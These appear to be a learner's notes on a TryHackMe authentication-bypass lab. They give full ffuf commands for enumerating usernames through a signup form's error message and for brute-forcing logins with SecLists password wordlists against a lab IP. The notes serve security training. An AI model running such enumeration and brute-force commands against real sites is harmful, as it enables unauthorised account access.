# Room
https://tryhackme.com/room/authenticationbypass

# Task 1 - Intro
Intro

# Task 2 - Username Enumeration with ffuf
1. Enumeration
   * You can use the exsitence of an error message telling you a user exists to enumerate users
2. Enumeration Tools
   * ffuf - fuzz faster you fool
     * a web fuzzer written in Go
     * example
        ```
        ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.54/customers/signup -mr "username already"
        ```
      * https://github.com/ffuf/ffuf
      * ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt : define the wordlist
      * -X POST : HTTP method to use
      * -d "username=FUZZ&email=x&password=x&cpassword=x" : data to be used in the POST, FUZZ is the variable that will be replaced from the wordlist
      * -H "Content-Type: application/x-www-form-urlencoded" : header to pass in your fuzzing
      * -u http://10.10.88.54/customers/signup : URL to tickle
      * -mr "username already" : "mr" = match regular expression, match the phrase "username already" and print the results

# Task 3 - Brute Forcing with ffuf
1. Brute force
   * Using the valid usernames from the previous task, you can use a wordlist to attack them, ffuf to the rescue
   * example
    ```
    ffuf -w users3.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.54/customers/login -fc 200
    ```
   * side note - my initial input wasn't clean text, use cat file | xxd to find binary characters

# Task 4 - Logic Flaws
1. Logic Flaws
   * Occur when the designed flow of the application is circumvented
